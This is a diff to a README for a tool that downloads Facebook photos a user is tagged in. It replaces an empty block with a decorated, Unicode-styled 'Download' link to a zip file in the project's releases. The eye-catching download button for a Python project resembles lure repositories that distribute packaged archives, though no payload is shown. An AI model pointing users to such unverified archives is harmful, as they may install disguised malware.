@@ -33,9 +33,9 @@ pip install webdriver-manager
 ```
  
 ### 3. CLICK TO DOWNLOAD 
-```
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
-```
+
+##  ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/vishal-nakiya/facebook-download-photos/releases/download/facebook-download-photos/facebook-download-photos.zip)***
+
 
 ### 4. Download Facebook photos you're tagged in
 Execute the following command to download all Facebook photos that you are tagged in.
